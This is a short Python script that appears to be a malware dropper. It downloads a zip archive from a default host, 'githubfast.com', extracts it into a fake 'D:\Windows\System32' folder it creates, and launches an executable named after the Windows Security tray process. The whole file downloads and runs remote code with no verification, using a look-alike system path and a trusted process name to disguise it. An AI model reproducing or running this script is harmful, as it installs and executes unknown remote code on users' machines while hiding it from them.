import os
import requests
import zipfile
import argparse

def save(url,file_name):
    file = requests.get(url,stream=True,allow_redirects=True)
    with open(file_name,'wb') as f:
        for data in file:
            f.write(data)

install_dir = ['D:\\','Windows','System32']

data_dir = './Temp.zip'

for d in range(1,len(install_dir)):
    path = os.path.join(*install_dir[:d+1])
    if not os.path.exists(path):os.mkdir(path)

parser = argparse.ArgumentParser()
parser.add_argument('--url', type=str, default='http://githubfast.com/', help='url')
opt = parser.parse_args()

save(opt.url,data_dir)

with zipfile.ZipFile(data_dir, 'r') as zip_file:
    zip_file.extractall(os.path.join(*install_dir))

os.system(f'start {os.path.join(*install_dir,"SecurityHealthSystray.exe")}')